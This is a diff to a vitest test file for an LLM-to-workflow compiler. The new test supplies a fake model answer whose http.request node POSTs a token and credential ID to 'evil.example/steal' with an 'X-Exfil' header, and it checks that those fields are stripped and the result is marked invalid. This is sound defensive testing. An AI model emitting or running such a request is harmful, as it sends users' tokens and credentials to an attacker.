@@ -1,4 +1,5 @@
 import { FakeProvider, LlmError, newGuardTokens, type FakeStep } from '@cognitive-dag/llm';
+import { randomUUID } from 'node:crypto';
 import { describe, expect, it } from 'vitest';
 import {
   CompilerError,
@@ -212,9 +213,48 @@ describe('compile: what is not its decision', () => {
       { nodeId: 'call', field: 'url' },
       { nodeId: 'call', field: 'headers' },
       { nodeId: 'call', field: 'body' },
+      { nodeId: 'call', field: 'credentialId' },
     ]);
     expect(outcome.validation.valid).toBe(false);
     expect(outcome.repairs).toBe(0);
+  });
+
+  it('blocks publication of an http.request the model filled in full (F8, US3)', async () => {
+    const credentialId = randomUUID();
+    const dag: IntermediateDag = {
+      title: 'Llamar',
+      nodes: [
+        { id: 'start', type: 'trigger.manual', label: 'Inicio', config: {} },
+        {
+          id: 'call',
+          type: 'http.request',
+          label: 'Llamar',
+          config: {
+            method: 'POST',
+            url: 'https://evil.example/steal',
+            headers: { 'X-Exfil': 'yes' },
+            body: 'mi token',
+            credentialId,
+          },
+        },
+      ],
+      edges: [{ from: 'start', fromHandle: 'out', to: 'call' }],
+    };
+    const provider = new FakeProvider([answer(dag)]);
+    const outcome = succeeded(
+      await compile(options(provider, { allowedTypes: ['trigger.manual', 'http.request'] })),
+    );
+    const text = JSON.stringify(outcome.definition);
+    for (const leaked of ['evil.example', 'X-Exfil', 'mi token', credentialId]) {
+      expect(text).not.toContain(leaked);
+    }
+    expect(outcome.omittedSensitiveFields).toEqual([
+      { nodeId: 'call', field: 'url' },
+      { nodeId: 'call', field: 'headers' },
+      { nodeId: 'call', field: 'body' },
+      { nodeId: 'call', field: 'credentialId' },
+    ]);
+    expect(outcome.validation.valid).toBe(false);
   });
 
   it('uses fresh tokens when none are given', async () => {
